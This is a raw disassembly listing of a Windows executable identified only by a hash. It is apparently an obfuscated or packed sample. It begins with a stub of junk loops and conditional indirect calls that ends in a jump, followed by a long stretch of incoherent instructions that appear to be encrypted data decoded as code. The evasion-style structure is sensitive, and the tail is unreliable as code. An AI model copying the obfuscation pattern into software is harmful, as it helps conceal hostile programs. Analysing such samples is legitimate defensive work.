
b103831a59e14c2a4eabed1d17609c047e81ff13123f38da334b8b0abf527859.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c16
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d22
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x423822
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238e9
  4012ea:	push   0x42396d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	pop    edx
  40143e:	pop    ds
  40143f:	ss loopne 0x4014a4
  401442:	bound  esp,QWORD PTR [edx+0x62]
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	ja     0x4014c9
  401454:	inc    ebp
  401455:	icebp  
  401456:	jecxz  0x4014ca
  401458:	inc    edx
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	out    0x2f,eax
  401506:	xor    al,0xfe
  401508:	shl    DWORD PTR [ecx-0x27],0xe1
  40150c:	leave  
  40150d:	and    bl,BYTE PTR ds:0x8e0c0a41
  401513:	repz jge 0x401511
  401516:	(bad)  
  401517:	retf   
  401518:	data16 jge 0x4014ab
  40151b:	(bad)  
  40151c:	mov    dh,0x75
  40151e:	leave  
  40151f:	repnz or ebx,esp
  401522:	int    0x2a
  401524:	and    eax,0xf5c2ca1a
  401529:	leave  
  40152a:	xchg   edx,eax
  40152b:	test   BYTE PTR [edi],al
  40152d:	call   0x7cb0691d
  401532:	xor    dl,BYTE PTR [edx+0x58f2216e]
  401538:	call   0x3084:0xecbd8acb
  40153f:	and    cl,BYTE PTR [ebp+ebp*2+0x26504e3d]
  401546:	fldenv [edi]
  401548:	ficom  DWORD PTR [ebx+0xc1b9d72]
  40154e:	jge    0x401531
  401550:	test   al,0x1c
  401552:	clc    
  401553:	dec    eax
  401554:	push   ss
  401555:	in     eax,dx
  401556:	into   
  401557:	repz sbb ebx,ebx
  40155a:	daa    
  40155b:	xchg   edx,eax
  40155c:	xchg   esi,eax
  40155d:	dec    ebx
  40155e:	xchg   ebp,eax
  40155f:	pop    ebp
  401560:	and    ch,BYTE PTR [ebx+0x5fef397d]
  401566:	add    ebx,DWORD PTR [edi+0x1c119291]
  40156c:	pop    ss
  40156d:	push   eax
  40156e:	jl     0x401542
  401570:	push   esp
  401571:	nop
  401572:	mov    ds:0x2cc2e7da,eax
  401577:	out    dx,al
  401578:	ret    
  401579:	pop    ebp
  40157a:	in     eax,0x26
  40157c:	sar    DWORD PTR [edx+0xc],0x3e
  401580:	xchg   edi,eax
  401581:	pop    es
  401582:	dec    edx
  401583:	imul   edx,eax,0xe35a182b
  401589:	mov    dl,0x32
  40158b:	ror    DWORD PTR [edx+eiz*1],1
  40158e:	cmp    BYTE PTR [ecx],ah
  401590:	sbb    BYTE PTR [eax],cl
  401592:	pop    ebx
  401593:	push   ecx
  401594:	(bad)  
  401595:	repz sbb ebp,DWORD PTR [ecx-0x36]
  401599:	outs   dx,BYTE PTR ds:[esi]
  40159a:	sti    
  40159b:	sbb    dh,BYTE PTR [eax-0x528538d0]
  4015a1:	dec    ebp
  4015a2:	pop    ebp
  4015a3:	gs mov ah,0xe9
  4015a6:	gs mov ebx,cs
  4015a9:	xchg   ebx,eax
  4015aa:	and    al,0xcd
  4015ac:	aas    
  4015ad:	add    ebx,DWORD PTR [eax+0x5b]
  4015b0:	(bad)  
  4015b1:	push   ecx
  4015b2:	jp     0x4015a0
  4015b4:	push   esi
  4015b5:	sbb    eax,DWORD PTR [edi-0x2]
  4015b8:	xchg   ebx,eax
  4015b9:	mov    edi,0x87252cde
  4015be:	mov    esp,0x4fa51175
  4015c3:	lds    esi,FWORD PTR [eax-0xc]
  4015c6:	fdivr  QWORD PTR [ecx]
  4015c8:	stos   DWORD PTR es:[edi],eax
  4015c9:	mov    DWORD PTR [edi+0x50],eax
  4015cc:	call   0xa7e3:0xf969b518
  4015d3:	jae    0x40157c
  4015d5:	push   ecx
  4015d6:	jne    0x401641
  4015d8:	loop   0x4015f4
  4015da:	mov    eax,ds:0xb55d70f
  4015df:	ins    DWORD PTR es:[edi],dx
  4015e0:	cmp    BYTE PTR [ebx+0x7c94bd77],ah
  4015e6:	std    
  4015e7:	(bad)  
  4015e9:	pop    edi
  4015ea:	jecxz  0x401618
  4015ec:	and    al,0x40
  4015ee:	pavgw  mm5,mm0
  4015f1:	and    eax,0xffebdcde
  4015f6:	call   0xaee:0xb1bbcd5e
  4015fd:	inc    ebp
  4015fe:	repnz mov eax,ds:0x83112181
  401604:	(bad)  
  401605:	in     al,dx
  401606:	ja     0x4015dd
  401608:	lods   al,BYTE PTR ds:[esi]
  401609:	jmp    0x492a:0x9416b74a
  401610:	scas   eax,DWORD PTR es:[edi]
  401611:	test   eax,0x4446abbc
  401616:	aad    0x5
  401618:	jne    0x401686
  40161a:	cld    
  40161b:	push   edi
  40161c:	int    0xe3
  40161e:	push   0x21e8dff5
  401623:	or     ch,bl
  401625:	pop    ebx
  401626:	sub    cl,cl
  401628:	or     BYTE PTR [eax-0x4bcfa64f],bl
  40162e:	inc    ecx
  40162f:	add    DWORD PTR [ebp-0x7a7c754c],ebp
  401635:	inc    eax
  401636:	idiv   DWORD PTR [edi]
  401638:	mov    ds:0x27c1daa6,al
  40163d:	shr    eax,0x75
  401640:	leave  
  401641:	xor    esi,0xffffffec
  401644:	lock pop edx
  401646:	dec    edi
  401647:	je     0x4015d2
  401649:	xor    eax,0xb67d9b37
  40164e:	fistp  DWORD PTR [edx]
  401650:	cwde   
  401651:	xchg   ebp,ecx
  401653:	or     ebx,esi
  401655:	ja     0x40168b
  401657:	pop    esp
  401658:	push   ss
  401659:	xor    al,0x1a
  40165b:	xor    DWORD PTR [eax+0x0],esp
  40165e:	xor    eax,0xd37dc2b1
  401663:	sub    bl,BYTE PTR [edx-0x61]
  401666:	and    eax,0x46575d2b
  40166b:	stos   DWORD PTR es:[edi],eax
  40166c:	sub    ebx,ecx
  40166e:	imul   DWORD PTR [edi-0x2491c0e3]
  401674:	retf   
  401675:	cmp    ebp,edi
  401677:	cmc    
  401678:	daa    
  401679:	cld    
  40167a:	push   edx
  40167b:	out    0xcf,al
  40167d:	out    dx,al
  40167e:	jl     0x4016d7
  401680:	inc    edi
  401681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401682:	inc    esp
  401683:	lock shl BYTE PTR [ebp+0x6515259e],cl
  40168a:	dec    ecx
  40168b:	pop    esp
  40168c:	sub    ah,cl
  40168e:	popf   
  40168f:	sub    DWORD PTR [ecx+0x50],eax
  401692:	mov    ah,0x7f
  401694:	cli    
  401695:	push   esp
  401696:	sbb    al,0x72
  401698:	pop    ebp
  401699:	les    edx,FWORD PTR [edi+0x64]
  40169c:	icebp  
  40169d:	fidiv  WORD PTR [ebx]
  40169f:	in     al,dx
  4016a0:	push   ebp
  4016a1:	jmp    0xe74a:0x2b3d9dc1
  4016a8:	mov    ds:0x4cf015f1,al
  4016ad:	leave  
  4016ae:	add    bl,cl
  4016b0:	or     eax,0x5894083d
  4016b5:	out    0xc9,eax
  4016b7:	pop    eax
  4016b8:	imul   eax,ebp,0x1ad24151
  4016be:	push   es
  4016bf:	xor    bl,BYTE PTR [edx+0x68c92ea0]
  4016c5:	popf   
  4016c6:	sbb    DWORD PTR [eax],ebx
  4016c8:	jge    0x401672
  4016ca:	cmp    ebp,edi
  4016cc:	sti    
  4016cd:	stos   DWORD PTR es:[edi],eax
  4016ce:	jmp    0xb756e367
  4016d3:	and    bl,0xc1
  4016d6:	loopne 0x401738
  4016d8:	arpl   WORD PTR [ecx-0x3ba86532],bp
  4016de:	sti    
  4016df:	addr16 dec esi
  4016e1:	and    bh,BYTE PTR [ebp+0x1984ffbe]
  4016e7:	cmp    al,0x49
  4016e9:	xchg   BYTE PTR [esp+esi*8],ah
  4016ec:	cmp    dh,BYTE PTR [edx]
  4016ee:	sub    BYTE PTR [edi],0x18
  4016f1:	sub    DWORD PTR [edi+0x371e99f5],ecx
  4016f7:	test   BYTE PTR [ebx-0x15281b90],cl
  4016fd:	test   bh,bl
  4016ff:	mov    bl,0xa7
  401701:	and    ebp,edi
  401703:	add    bl,ch
  401705:	inc    edx
  401706:	in     al,0x3
  401708:	jae    0x40170c
  40170a:	data16 hlt 
  40170c:	daa    
  40170d:	loop   0x401766
  40170f:	out    dx,eax
  401710:	jno    0x401726
  401712:	imul   ebp,DWORD PTR [ecx],0x8ec529d8
  401718:	mov    DWORD PTR [edx-0x3811ae00],edx
  40171e:	dec    esi
  40171f:	pop    esi
  401720:	out    dx,al
  401721:	mov    bh,0x51
  401723:	shl    ah,1
  401725:	dec    edi
  401726:	test   eax,0x97e9d132
  40172b:	cdq    
  40172c:	ins    DWORD PTR es:[edi],dx
  40172d:	add    cl,0x20
  401730:	imul   ebx,DWORD PTR [eax+edi*2-0x18],0xffffff92
  401735:	pop    esi
  401736:	xchg   edx,eax
  401737:	jne    0x4016e1
  401739:	mov    cl,0xc2
  40173b:	daa    
  40173c:	mov    eax,0xcaec9785
  401741:	xchg   esp,eax
  401742:	test   eax,0x8ea96d21
  401747:	cmc    
  401748:	loopne 0x4016fd
  40174a:	ret    
  40174b:	dec    edx
  40174c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40174d:	mov    cl,0x31
  40174f:	mov    ds:0x7e55fad9,eax
  401754:	rcl    esp,1
  401756:	or     DWORD PTR [ebp+0x527dd108],edi
  40175c:	gs jno 0x401740
  40175f:	mov    esi,0x3d19fa1
  401764:	mov    ah,0x12
  401766:	sbb    cl,BYTE PTR [eax+esi*1-0x2b39758]
  40176d:	mov    eax,ds:0x36d6d7e1
  401772:	enter  0xf9c4,0x3e
  401776:	add    al,0xe7
  401778:	fmul   DWORD PTR [edi-0x31]
  40177b:	inc    esp
  40177c:	xchg   esp,edi
  40177e:	frstor [edx-0x7bec395b]
  401784:	stos   DWORD PTR es:[edi],eax
  401785:	in     eax,dx
  401786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401787:	clc    
  401788:	leave  
  401789:	int    0x80
  40178b:	dec    esp
  40178c:	push   esi
  40178d:	inc    ecx
  40178e:	dec    esp
  40178f:	push   ebp
  401790:	xchg   ecx,eax
  401791:	lods   al,BYTE PTR ds:[esi]
  401792:	in     al,dx
  401793:	adc    BYTE PTR [ebx],dl
  401795:	add    eax,0x98f6818f
  40179a:	(bad)  
  40179b:	and    bh,ch
  40179d:	push   esi
  40179e:	in     al,0xbc
  4017a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a1:	xor    eax,0xfd7d375e
  4017a6:	xlat   BYTE PTR ds:[ebx]
  4017a7:	sub    dh,bl
  4017a9:	mov    ah,0x22
  4017ab:	out    dx,al
  4017ac:	lods   al,BYTE PTR ds:[esi]
  4017ad:	mov    WORD PTR [ecx-0x1a],?
  4017b0:	fnstcw WORD PTR [edi-0x1c]
  4017b3:	ss dec esi
  4017b5:	xchg   ecx,eax
  4017b6:	js     0x40177b
  4017b8:	outs   dx,DWORD PTR ds:[esi]
  4017b9:	sbb    BYTE PTR [esi],ch
  4017bb:	pushf  
  4017bc:	hlt    
  4017bd:	rol    BYTE PTR [ecx-0x64],1
  4017c0:	mov    BYTE PTR cs:[ebx+edi*2+0x5fcecf19],al
  4017c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c9:	add    BYTE PTR [ebx+eiz*4+0x7f],cl
  4017cd:	mov    ecx,0x97ad6412
  4017d2:	aam    0x24
  4017d4:	adc    esi,eax
  4017d6:	js     0x40177c
  4017d8:	inc    edx
  4017d9:	adc    bh,bl
  4017db:	xor    DWORD PTR [ebp+0x73],ebp
  4017de:	pop    ds
  4017df:	adc    dl,BYTE PTR ds:0x5abf639
  4017e5:	mov    edx,0x42d2dc63
  4017ea:	(bad)  
  4017eb:	and    al,0x60
  4017ed:	adc    BYTE PTR [edi-0x3b],ah
  4017f0:	add    dh,bh
  4017f2:	mov    edx,0x36489177
  4017f7:	jno    0x401796
  4017f9:	(bad)  
  4017fa:	arpl   WORD PTR [eax],bx
  4017fc:	ja     0x4017fa
  4017fe:	sbb    eax,0x835d5d21
  401803:	pop    edx
  401804:	repz jl 0x401851
  401807:	mov    bl,ch
  401809:	(bad)  [esi]
  40180b:	sbb    BYTE PTR [eax+0x6a],cl
  40180e:	ins    DWORD PTR es:[edi],dx
  40180f:	(bad)  
  401810:	outs   dx,DWORD PTR ds:[esi]
  401811:	js     0x401797
  401813:	shl    BYTE PTR [ebx+0x7427cf57],1
  401819:	sti    
  40181a:	xchg   ebx,eax
  40181b:	loopne 0x4017a4
  40181d:	bound  esp,QWORD PTR [esi+0x1]
  401820:	dec    ecx
  401821:	add    dl,BYTE PTR [esi-0x7b6a77ab]
  401827:	mov    WORD PTR [eax+esi*4],ss
  40182a:	push   0x7e
  40182c:	hlt    
  40182d:	mov    ebx,0x3b6e9450
  401832:	mov    ebp,0x443ba378
  401837:	xchg   esp,eax
  401838:	frstor [ebx-0x6]
  40183b:	pop    ecx
  40183c:	test   al,bl
  40183e:	add    al,0x62
  401840:	js     0x40180d
  401842:	dec    edx
  401843:	pop    edx
  401844:	xchg   DWORD PTR [esi],esp
  401846:	outs   dx,DWORD PTR ds:[esi]
  401847:	int    0x74
  401849:	jl     0x4017e9
  40184b:	ds jb  0x40184e
  40184e:	rol    DWORD PTR [esi+ebp*4+0x794a2279],0x34
  401856:	push   ds
  401857:	mul    DWORD PTR [edx-0x3c]
  40185a:	jne    0x401837
  40185c:	lock sahf 
  40185e:	rcr    DWORD PTR [eax+ebx*4-0xde17a35],0x66
  401866:	mov    WORD PTR [esi-0x9152bd6],fs
  40186c:	mov    edx,0xf1c01daa
  401871:	push   cs
  401872:	mov    esp,0x9285aedc
  401877:	add    eax,0x1656a8c1
  40187c:	imul   eax
  40187e:	xor    eax,0x4bdc1eb9
  401883:	out    0x8a,eax
  401885:	fistp  DWORD PTR [ecx-0x3c]
  401888:	jmp    0x4dccfd8f
  40188d:	ja     0x401847
  40188f:	(bad)  
  401890:	cld    
  401891:	test   al,0xe7
  401893:	sbb    eax,0x944cb3ee
  401898:	push   ebx
  401899:	push   ebx
  40189a:	inc    ecx
  40189b:	jnp    0x401857
  40189d:	push   esi
  40189e:	aaa    
  40189f:	push   edi
  4018a0:	push   esi
  4018a1:	or     eax,0x8ee1922f
  4018a6:	xor    BYTE PTR [ecx+0x6],ch
  4018a9:	shl    DWORD PTR [edi+0x55],1
  4018ac:	cli    
  4018ad:	cmc    
  4018ae:	(bad)  
  4018af:	out    dx,al
  4018b0:	adc    al,0x5f
  4018b2:	sub    ch,dl
  4018b4:	cli    
  4018b5:	sbb    ebx,0x62
  4018b8:	mov    edi,0x12c92919
  4018bd:	lods   eax,DWORD PTR ds:[esi]
  4018be:	mov    ch,dh
  4018c0:	rep ins BYTE PTR es:[edi],dx
  4018c2:	iret   
  4018c3:	pop    edx
  4018c4:	inc    esp
  4018c5:	ror    esi,cl
  4018c7:	xchg   edx,eax
  4018c8:	inc    edx
  4018c9:	and    esp,DWORD PTR [ecx-0x68]
  4018cc:	xchg   BYTE PTR ds:0x7e4b60b9,dl
  4018d2:	(bad)  
  4018d3:	dec    ebx
  4018d4:	lods   eax,DWORD PTR ds:[esi]
  4018d5:	stc    
  4018d6:	push   ebx
  4018d7:	jecxz  0x4018b3
  4018d9:	jb     0x4018d5
  4018db:	pop    eax
  4018dc:	cmp    DWORD PTR [edi-0x1f92bcb3],eax
  4018e2:	pusha  
  4018e3:	test   eax,0x6c66dfcc
  4018e8:	pop    esp
  4018e9:	jo     0x401925
  4018eb:	xor    DWORD PTR [edx+0x258ed8d1],esi
  4018f1:	jo     0x40193f
  4018f3:	cld    
  4018f4:	test   BYTE PTR [edi],bh
  4018f6:	or     ah,BYTE PTR [edx+0x4]
  4018f9:	stos   BYTE PTR es:[edi],al
  4018fa:	gs dec esi
  4018fc:	loop   0x401900
  4018fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018ff:	dec    edi
  401900:	xchg   ebx,eax
  401901:	dec    eax
  401902:	lods   al,BYTE PTR ds:[esi]
  401903:	ficom  DWORD PTR [edx+0x44]
  401906:	sub    DWORD PTR [edi+0x75b9d0b3],0xb88053a8
  401910:	sbb    BYTE PTR [eax],dl
  401912:	lods   al,BYTE PTR ds:[esi]
  401913:	jae    0x40195a
  401915:	out    0x63,eax
  401917:	jns    0x401920
  401919:	cmc    
  40191a:	or     eax,0x46dcaeaf
  40191f:	jno    0x401982
  401921:	je     0x4018c2
  401923:	or     BYTE PTR [ebx+0x57],0x13
  401927:	push   0xffffffcc
  401929:	push   edx
  40192a:	(bad)
  40192d:	fcom   QWORD PTR [edi]
  40192f:	sbb    ebx,0x17
  401932:	jbe    0x4018b5
  401934:	ja     0x401939
